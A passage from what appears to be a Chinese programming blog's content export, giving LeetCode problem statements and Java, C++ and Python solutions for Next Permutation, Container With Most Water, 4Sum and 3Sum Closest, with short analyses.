class="built_in">printf</span>(<span class="string">":%02d\n"</span>,j);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
]]></content>
      <tags>
        <tag>PAT</tag>
        <tag>PAT-Basic</tag>
      </tags>
  </entry>
  <entry>
    <title>31. Next Permutation</title>
    <url>/2018/02/05/31-Next-Permutation/</url>
    <content><![CDATA[<p>Implement <strong>next permutation</strong>, which rearranges numbers into the lexicographically next greater permutation of numbers.</p>
<p>If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).</p>
<p>The replacement must be <strong><a href="http://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener">in-place</a></strong> and use only constant extra memory.</p>
<p>Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.</p>
<p><code>1,2,3</code> → <code>1,3,2</code><br><code>3,2,1</code> → <code>1,2,3</code><br><code>1,1,5</code> → <code>1,5,1</code></p>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>详细参见：<a href="https://leetcode.com/articles/next-permutation/" target="_blank" rel="noopener">https://leetcode.com/articles/next-permutation/</a></p>
<p><img src="/images/31_nums_graph.png" alt="Alt text"></p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/next-permutation/</span></span><br><span class="line"><span class="comment"> * Beats : 99.99%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; nums[i + <span class="number">1</span>] &lt;= nums[i]) &#123;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = n;</span><br><span class="line">            <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; nums[j] &lt;= nums[i]) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            swap(nums, i, j);</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(nums, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = nums[i];</span><br><span class="line">        nums[i] = nums[j];</span><br><span class="line">        nums[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> end = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            swap(nums, start, end);</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/next-permutation/</span></span><br><span class="line"><span class="comment"> * Beats : 58.63%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(n);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="keyword">int</span> i = n - <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; nums[i] &gt;= nums[i + <span class="number">1</span>])&#123;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (i &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">int</span> j = n - <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; nums[j] &lt;= nums[i])&#123;</span><br><span class="line">				j--;</span><br><span class="line">			&#125;</span><br><span class="line">			swap(nums[i], nums[j]);</span><br><span class="line">		&#125;</span><br><span class="line">		reverse(nums.begin()+i+<span class="number">1</span>,nums.end());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/next-permutation/</span></span><br><span class="line"><span class="comment"> * Beats : 58.63%</span></span><br><span class="line"><span class="comment"> * 直接使用c++函数库</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        next_permutation(nums.begin(), nums.end());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self, nums, start, end)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            self.swap(nums,start, end)</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">            end -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(self, nums, i, j)</span>:</span></span><br><span class="line">        temp = nums[i]</span><br><span class="line">        nums[i] = nums[j]</span><br><span class="line">        nums[j] = temp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nextPermutation</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        i = len(nums) - <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span> <span class="keyword">and</span> nums[i + <span class="number">1</span>] &lt;= nums[i]:</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">            j = len(nums) - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &gt;= <span class="number">0</span> <span class="keyword">and</span> nums[j] &lt;= nums[i]:</span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">            self.swap(nums, i, j)</span><br><span class="line">        self.reverse(nums, i + <span class="number">1</span>, len(nums) - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个全排列问题，其实有固定的一套解决办法，没有技巧，需要配合图，来记住这个套路。</p>
]]></content>
      <tags>
        <tag>Array</tag>
        <tag>LeetCode-medium</tag>
        <tag>排列组合(Permutation)</tag>
      </tags>
  </entry>
  <entry>
    <title>11. Container With Most Water</title>
    <url>/2018/02/04/11-Container-With-Most-Water/</url>
    <content><![CDATA[<p>Given <em>n</em> non-negative integers <em>a1</em>, <em>a2</em>, …, <em>an</em> , where each represents a point at coordinate (<em>i</em>, <em>ai</em>). <em>n</em> vertical lines are drawn such that the two endpoints of line <em>i</em> is at (<em>i</em>, <em>ai</em>) and (<em>i</em>, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.</p>
<p><strong>Note:</strong> You may not slant the container and <em>n</em> is at least 2.</p>
<p><img src="/images/question_11.jpg" alt="Alt text"></p>
<p>The above vertical lines are represented by array [1,8,6,2,5,4,8,3,7]. In this case, the max area of water (blue section) the container can contain is 49.</p>
<p><strong>Example:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line">Output: <span class="number">49</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题目一开始，我定位在动态规划问题，在实现的时候遇到了不能解决的逻辑上的问题，只好参考了别人的解法。</p>
<p>发现其实这道题目是二分法问题，具体实现可以用双指针实现。</p>
<h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(height[low] &lt; height[high]) &#123;</span><br><span class="line">    low++;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    high--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段逻辑的证明：当<code>height[low] &lt; height[high]</code>时，如果<code>high--</code>，那么<code>Math.min(height[low], height[high])*(high-low);</code><strong>一定小于原来的面积</strong>，这个可以根据图来分析。逻辑上，开始当以<code>height[low]</code>作为高，此时如果<code>high--</code>，且<code>height[low]&lt;height[high]</code>时，那么仍以<code>height[low]</code>作为高的矩形一定更小，因为长一定变短（索引减小了）；而另一种情况当<code>height[high]&lt;height[low]</code>时，不仅长变短了，而且高也变短了，高为<code>height[high]</code>了，面积一定小于原面积。所以就没必要使<code>high--</code>了，因为一定是小于原面积的，此时，需要<code>low++</code>来查找下一个面积了。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/container-with-most-water</span></span><br><span class="line"><span class="comment"> * Beats : 95.02%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(logn);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>,high = height.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> area = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high) &#123;</span><br><span class="line">            <span class="keyword">int</span> sum = Math.min(height[low], height[high])*(high-low);</span><br><span class="line">            area = sum &gt;area?sum:area;</span><br><span class="line">            <span class="keyword">if</span>(height[low] &lt; height[high]) &#123;</span><br><span class="line">                low++;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                high--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> area;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> low = <span class="number">0</span>, high = height.size() - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> area = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">			area = max(area,min(height[low],height[high])*(high - low));</span><br><span class="line">			<span class="keyword">if</span> (height[low] &lt; height[high])&#123;</span><br><span class="line">				low++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				high--;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">			<span class="keyword">return</span> area;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxArea</span><span class="params">(self, height)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type height: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        high = len(height) - <span class="number">1</span></span><br><span class="line">        area = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            area = max(area,min(height[low],height[high])*(high-low))</span><br><span class="line">            <span class="keyword">if</span> height[low] &lt; height[high]:</span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> area</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>如何定位，这道题，难在定位上，如何分析题目类型很重要，一开始我定位在了动态规划上，结果解不出来，最后使用双指针解决了。</li>
<li>本题难点，在于双指针的条件判断上。</li>
</ol>
]]></content>
      <tags>
        <tag>双指针+逼近法</tag>
        <tag>Array</tag>
        <tag>LeetCode-medium</tag>
      </tags>
  </entry>
  <entry>
    <title>18. 4Sum</title>
    <url>/2018/02/04/18-4Sum/</url>
    <content><![CDATA[<p>Given an array <code>nums</code> of <em>n</em> integers and an integer <code>target</code>, are there elements <em>a</em>, <em>b</em>, <em>c</em>, and <em>d</em> in <code>nums</code> such that <em>a</em> + <em>b</em> + <em>c</em> + <em>d</em> = <code>target</code>? Find all unique quadruplets in the array which gives the sum of <code>target</code>.</p>
<p><strong>Note:</strong></p>
<p>The solution set must not contain duplicate quadruplets.</p>
<p><strong>Example:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Given array nums = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">2</span>, <span class="number">2</span>], and target = <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [-<span class="number">1</span>,  <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">  [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">  [-<span class="number">2</span>,  <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/4sum/</span></span><br><span class="line"><span class="comment"> * Beats :  84.10% </span></span><br><span class="line"><span class="comment"> * Time complicity is O(n^2logn);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; fourSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n - <span class="number">2</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt; i + <span class="number">1</span> &amp;&amp; nums[j] == nums[j - <span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">int</span> low = j + <span class="number">1</span>, high = n - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">                    <span class="keyword">int</span> sum = nums[i] + nums[j] + nums[low] + nums[high];</span><br><span class="line">                    <span class="keyword">if</span> (sum &lt; target) &#123;</span><br><span class="line">                        low++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                        high--;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        result.add(Arrays.asList(nums[i], nums[j], nums[low], nums[high]));</span><br><span class="line">                        <span class="keyword">while</span> (low &lt; high &amp;&amp; nums[low] == nums[low + <span class="number">1</span>])</span><br><span class="line">                            low++;</span><br><span class="line">                        <span class="keyword">while</span> (low &lt; high &amp;&amp; nums[high] == nums[high - <span class="number">1</span>])</span><br><span class="line">                            high--;</span><br><span class="line">                        low++;</span><br><span class="line">                        high--;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/3sum-closest</span></span><br><span class="line"><span class="comment"> * time completicity is O(n2logn);</span></span><br><span class="line"><span class="comment"> * space complicity is O(1);</span></span><br><span class="line"><span class="comment"> * beats: 57.06%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; fourSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">		sort(nums.begin(), nums.end());</span><br><span class="line">		<span class="keyword">int</span> n = nums.size();</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">3</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//去除重复元素</span></span><br><span class="line">			<span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n - <span class="number">2</span>; j++)&#123;</span><br><span class="line">                <span class="comment">//去除重复元素</span></span><br><span class="line">				<span class="keyword">if</span> (j &gt; i + <span class="number">1</span> &amp;&amp; nums[j] == nums[j - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">int</span> low = j + <span class="number">1</span>, high = n - <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">					<span class="keyword">int</span> sum = nums[i] + nums[j] + nums[low] + nums[high];</span><br><span class="line">					<span class="keyword">if</span> (sum &lt; target)&#123;</span><br><span class="line">						low++;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target)&#123;</span><br><span class="line">						high--;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						result.push_back(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&#123;nums[i], nums[j], nums[low], nums[high]&#125;);</span><br><span class="line">                        <span class="comment">//去除重复元素</span></span><br><span class="line">						<span class="keyword">while</span> ((low &lt; high) &amp;&amp; (nums[low] == nums[low+ <span class="number">1</span>])) low++;</span><br><span class="line">						<span class="keyword">while</span> ((low &lt; high) &amp;&amp; (nums[high] == nums[high - <span class="number">1</span>])) high--;</span><br><span class="line">						low++;</span><br><span class="line">						high--;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fourSum</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums.sort()</span><br><span class="line">        n = len(nums)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, n - <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, n - <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> j &gt; i + <span class="number">1</span> <span class="keyword">and</span> nums[j] == nums[j - <span class="number">1</span>]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                low = j + <span class="number">1</span></span><br><span class="line">                high = n - <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high:</span><br><span class="line">                    sum = nums[i] + nums[j] + nums[low] + nums[high]</span><br><span class="line">                    <span class="keyword">if</span> sum &lt; target:</span><br><span class="line">                        low += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">elif</span> sum &gt; target:</span><br><span class="line">                        high -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        result.append([nums[i], nums[j], nums[low], nums[high]])</span><br><span class="line">                        <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low + <span class="number">1</span>]:</span><br><span class="line">                            low += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high - <span class="number">1</span>]:</span><br><span class="line">                            high -= <span class="number">1</span></span><br><span class="line">                        low += <span class="number">1</span></span><br><span class="line">                        high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当达到查找四个数相加的和时，没有什么好的办法了，除了两个数相加依然可以用双指针来减少时间复杂度，其余两个数的判断只能用循环的办法，所以它的时间复杂度是$O(n^2log)$</p>
<p><strong>注意</strong>：</p>
<ol>
<li>python的缩进问题，一定要对齐，这里python的<code>return result</code>没有对齐到最外层for循环，导致出现bug，调试时才发现。</li>
<li>python调试，直接在最外面调用函数，进入debug，f7单步执行，与c++基本一样。</li>
</ol>
]]></content>
      <tags>
        <tag>双指针+逼近法</tag>
        <tag>Array</tag>
        <tag>LeetCode-medium</tag>
      </tags>
  </entry>
  <entry>
    <title>16. 3Sum Closest</title>
    <url>/2018/02/04/16-3Sum-Closest/</url>
    <content><![CDATA[<p>Given an array <code>nums</code> of <em>n</em> integers and an integer <code>target</code>, find three integers in <code>nums</code> such that the sum is closest to <code>target</code>. Return the sum of the three integers. You may assume that each input would have exactly one solution.</p>
<p><strong>Example:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Given array nums = [-<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, -<span class="number">4</span>], and target = <span class="number">1</span>.</span><br><span class="line"></span><br><span class="line">The sum that is closest to the target is <span class="number">2</span>. (-<span class="number">1</span> + <span class="number">2</span> + <span class="number">1</span> = <span class="number">2</span>).</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li><p>二分法和双指针法，一定不要忘了排序；</p>
</li>
<li><p>去除重复元素。</p>
<p> 以上两个问题经过之前的实践，应该需要注意。</p>
</li>
</ol>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/3sum-closest/</span></span><br><span class="line"><span class="comment"> * Beats :  79.71%</span></span><br><span class="line"><span class="comment"> * Time complicity is O(nlogn);</span></span><br><span class="line"><span class="comment"> * Space complicity is O(1);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">threeSumClosest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span> closet = nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">int</span> low = i + <span class="number">1</span>, high = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">                <span class="keyword">int</span> sum = nums[i] + nums[low] + nums[high];</span><br><span class="line">                closet = Math.abs(sum - target) &lt; Math.abs(closet - target) ? sum : closet;</span><br><span class="line">                <span class="keyword">if</span>(sum &lt; target) &#123;</span><br><span class="line">                    low++;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &gt; target) &#123;</span><br><span class="line">                    high--;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> closet;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> closet;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
